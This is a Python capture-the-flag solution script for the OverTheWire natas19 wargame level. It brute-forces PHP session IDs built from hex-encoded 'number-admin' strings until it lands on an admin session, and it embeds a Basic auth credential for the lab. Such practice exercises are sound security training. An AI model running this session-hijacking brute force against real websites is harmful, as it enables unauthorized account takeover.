import requests

for i in range(641):
    url = "http://natas19.natas.labs.overthewire.org/index.php"
    payload = {"username": "", "password": "aa"}
    headers = {"Cookie": "PHPSESSID={0}".format(str((str(i)+'-admin').encode('utf-8').hex())), "Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="}
    r = requests.post(url, params=payload, headers=headers)
    if "regular user" in r.text:
        print('fail session_id = '+str((str(i)+'-admin').encode('utf-8').hex()))
    else:
        print('succes session_id = '+str((str(i)+'-admin').encode('utf-8').hex()))
        exit(0)